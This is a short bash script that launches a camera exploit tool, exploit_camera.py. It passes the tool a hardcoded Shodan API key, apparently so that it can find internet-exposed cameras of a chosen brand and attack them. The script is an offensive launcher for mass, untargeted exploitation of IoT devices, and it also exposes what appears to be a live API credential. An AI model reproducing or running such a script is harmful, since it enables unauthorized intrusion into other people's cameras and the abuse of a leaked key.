#!/bin/bash

SHODAN_KEY="Jvt0B5uZIDPJ5pbCqMo12CqD7pdnMSEd"
CAMERA_BRAND=1

python3 exploit_camera.py -b $CAMERA_BRAND -v -t 10 --shodan $SHODAN_KEY
